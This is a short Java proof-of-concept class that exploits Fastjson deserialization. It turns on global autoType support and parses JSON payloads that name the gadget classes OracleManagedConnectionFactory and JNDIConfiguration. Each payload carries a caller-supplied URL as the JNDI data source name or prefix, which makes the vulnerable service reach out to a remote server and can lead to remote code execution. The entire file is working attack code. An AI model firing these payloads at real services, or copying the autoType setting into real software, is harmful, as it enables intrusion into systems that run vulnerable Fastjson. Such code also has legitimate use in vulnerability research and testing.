package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Poc {

    public static void run(String sourceURL, int type) {
        try {
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

            JSONObject obj  = null;
            String jsonStr1 ="{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"" + sourceURL + "\"}";
            String jsonStr2 = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"" + sourceURL + "\"}";

            if (type == 0) 
            {
                obj = JSON.parseObject(jsonStr1);
            }
            else
            {
                obj = JSON.parseObject(jsonStr2);
            }

            obj.toJSONString();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}